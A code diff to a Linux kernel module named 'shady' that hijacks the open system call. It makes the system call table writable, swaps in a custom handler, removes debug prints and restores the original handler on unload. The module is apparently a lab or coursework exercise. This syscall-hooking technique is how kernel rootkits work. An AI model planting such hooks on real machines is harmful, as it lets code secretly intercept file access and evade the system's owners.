@@ -233,29 +233,12 @@ shady_init_module(void)
   int devices_to_destroy = 0;
   dev_t dev = 0;
   unsigned int *system_call_table;
-
-  // static int system_call_table_address = 0xc15b3020; From before
-
   
   system_call_table = (unsigned int*)system_call_table_address;
   set_addr_rw((unsigned int)system_call_table);
-  printk("System call table found at %x\n", (unsigned int)system_call_table);
-
   old_open = (void*)*(system_call_table + __NR_open);
-  printk("Old open function found at %x\n", (unsigned int)old_open);
-  printk("My system call function at %x\n", (unsigned int)my_open);
   *(system_call_table + __NR_open) = (unsigned int)my_open;  
-  printk("Open call now points to    %x\n", (unsigned int)(system_call_table + __NR_open));
 
-  //old_open = (void*)system_call_array[__NR_open];
-
-  //open_pointer = system_call_table_address + 20;
-  //printk("Open pointer is located at: 0x%x\n", open_pointer);
-  //old_open = (void*) *(int*)open_pointer;
-  //printk("Old open function is at:    0x%x\n", (int)old_open);
-  //*(int*)open_pointer = (int)my_open;
-  //printk("Open calls fucntion at:     0x%x\n", *(int*)open_pointer);
-  	
   if (shady_ndevices <= 0)
     {
       printk(KERN_WARNING "[target] Invalid value of shady_ndevices: %d\n", 
@@ -307,6 +290,11 @@ shady_init_module(void)
 static void __exit
 shady_exit_module(void)
 {
+  unsigned int *system_call_table;
+  
+  system_call_table = (unsigned int*)system_call_table_address;
+  *(system_call_table + __NR_open) = (unsigned int)old_open;  
+
   shady_cleanup_module(shady_ndevices);
   return;
 }
